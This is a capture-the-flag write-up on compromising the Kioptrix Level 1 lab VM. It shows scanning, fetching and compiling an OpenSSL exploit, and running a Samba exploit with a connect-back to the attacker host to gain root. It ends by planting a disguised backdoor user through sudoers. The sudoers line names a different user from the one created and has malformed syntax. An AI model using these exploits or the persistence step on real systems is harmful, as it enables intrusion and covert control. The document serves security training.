This is the way I solved the Kioptrix Level 1

First from kali host:

```kali@me:>netdiscover -i eth0```

The netdiscover command outputs a nicer result respect to:

```nmap -sn 192.168.1.1-255```

resulting in:

Currently scanning: 192.168.51.0/16   |   Screen View: Unique Hosts                                                       `            `
22 Captured ARP Req/Rep packets, from 14 hosts.   Total size: 1284                                                         
_____________________________________

 IP            At MAC Address     Count     Len  MAC Vendor / Hostname     
 ...                                                            
 192.168.1.104   9e:86:37:32:02:d7      1      60  Unknown vendor Currently scanning: 192.168.51.0/16 

So target IP address is: 192.168.1.104 

Now we need to enumerate which services are running on the target 92.168.1.104:

The easiest and best command one can immagine:

sudo nmap -sV -O 192.168.1.104

The output is clean and clear:

Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-04 13:16 EST
Nmap scan report for 192.168.1.104
Host is up (0.0037s latency).
* Not shown: 994 closed ports
* PORT      STATE SERVICE     VERSION
* 22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
* 80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)

* 111/tcp   open  rpcbind     2 (RPC #100000)
* 139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
* 443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
* 32768/tcp open  status      1 (RPC #100024)
* MAC Address: 9E:86:37:32:02:D7 (Unknown)
* Device type: general purpose
* Running: Linux 2.4.X
* OS CPE: cpe:/o:linux:linux_kernel:2.4
* OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
* Network Distance: 1 hop

* To note that OpenSSL/0.96b is very old.... associated with mod_ssl/2.8.4
* Also note that we have a samba service on port 139... but we don't know the version so not a good starting point for an attack!


Looking in searchsplit:
> searchsploit OpenSSL 0.9.6

returns:

 Exploit Title:                                                                                   


Apache mod_ssl OpenSSL < 0.9.6d / < 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow     
| exploits/unix/remote/40347.txt

So the exploit 40347.txt is interesting because it offers root shell through buffer Overflow exploit

Looking at the bottom of the content of the 40347.txt file:

less /usr/share/exploitdb/exploits/unix/remote/40347.txt 

we see:

https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40347.tar.gz (openssl-too-open.tar.gz)

so:
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40347.tar.gz 

expand the tar archive:
> tar xvf 40347.tar.gz

> cd openssl-too-open

> make

The make returns quite some issues in the build process:

```c++
gcc -g -O0 -Wall -c main.c
In file included from main.c:26:
ssl2.h:30:24: error: ‘SSL2_MAX_CONNECTION_ID_LENGTH’ undeclared here (not in a function); did you mean ‘SSL_MAX_SSL_SESSION_ID_LENGTH’?
   30 |  unsigned char conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];
      |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      |                        SSL_MAX_SSL_SESSION_ID_LENGTH
ssl2.h:38:2: error: unknown type name ‘RC4_KEY’
   38 |  RC4_KEY* rc4_read_key;
      |  ^~~~~~~
ssl2.h:39:2: error: unknown type name ‘RC4_KEY’
   39 |  RC4_KEY* rc4_write_key;
      |  ^~~~~~~
make: *** [Makefile:28: main.o] Error 1

```

First you need to install:

>  yum install -y openssl-devel

The author of the link:
https://medium.com/@snowshoe/how-to-compile-openfuckv2-c-69e457b4a1d1
made a very good guide to solve all the compilation issues.

THe only thing you still have to update is that the l gcc flags need to be at the end of the command:

> gcc -g -o openssl-scanner scanner.o ssl2.o -lcrypto -lssl

Now it is time to run the exploit:
> ./openssl-too-open -a 0x09 -p 443 -c 40 -m 50 -v 192.168.1.104

```
The result is:
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=48(apache) gid=48(apache) groups=48(apache)
 10:34pm  up 13:02,  0 users,  load average: 0.00, 0.00, 0.09
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
bash-2.05$ 
bash-2.05$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

Now we are apache, so we need to find a way to do privilege escalation.

We are now inside the target box and we can have a look again at that Samba service on port 139. 
We try to retrieve more information about the Samba version. To achieve this, we run a pretty standard command:

> smbclient -N -L \\\\127.0.0.1

---
smbclient -N -L \\\\127.0.0.1
added interface ip=192.168.1.104 bcast=192.168.1.255 nmask=255.255.255.0
Anonymous login successful
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]

	Sharename      Type      Comment
	---------      ----      -------
	IPC$           IPC       IPC Service (Samba Server)
	ADMIN$         Disk      IPC Service (Samba Server)
---

So we have now a version: Samba 2.2.1a

Now it is time to go back to searchsploit:

> searchsploit samba 2.2

Among all the results we choose:

> Samba 2.2.x - Remote Buffer Overflow  exploits/linux/remote/7.pl

But after several tries, we do not achieve any root shell, so we move to the second option:

> Samba < 2.2.8 (Linux/BSD) - Remote Code Execution  exploits/multiple/remote/10.c

>  gcc -g -o samba2root 10.c

The compilation is smooth, I am surprised :-))

Now time to try it:

./samba2root -b 0 -c 192.168.1.26 -p 139 -v 192.168.1.104

---
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Verbose mode.
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Using ret: [0xbffffed4]
+ Using ret: [0xbffffda8]
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
----

So we are root now :-))

Now time to implant a new user with sudo powers so we do not have to work too much again:

> /usr/sbin/adduser mntd  (we choose something that seems plausible)
> passwd mntd
> echo -e "splunk\tALL(ALL) ALL" >> /etc/sudoers

Here you are :-)
